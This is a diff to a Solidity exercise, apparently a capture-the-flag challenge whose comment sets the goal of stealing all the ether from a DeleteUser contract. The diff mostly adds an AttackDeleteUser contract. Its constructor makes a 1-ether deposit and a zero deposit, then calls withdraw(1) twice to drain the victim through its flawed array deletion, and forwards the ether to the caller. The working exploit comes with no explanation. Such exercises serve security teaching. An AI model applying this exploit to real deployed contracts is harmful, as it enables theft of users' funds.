@@ -5,7 +5,7 @@ pragma solidity 0.8.15;
  * Your goal is to steal all the ether in the contract.
  *
  */
- 
+
 contract DeleteUser {
     struct User {
         address addr;
@@ -27,5 +27,15 @@ contract DeleteUser {
         users.pop();
 
         msg.sender.call{value: amount}("");
+    }
+}
+
+contract AttackDeleteUser {
+    constructor(DeleteUser victimContract) payable {
+        victimContract.deposit{value: 1 ether}();
+        victimContract.deposit();
+        victimContract.withdraw(1);
+        victimContract.withdraw(1);
+        msg.sender.call{value: 1 ether}("");
     }
 }
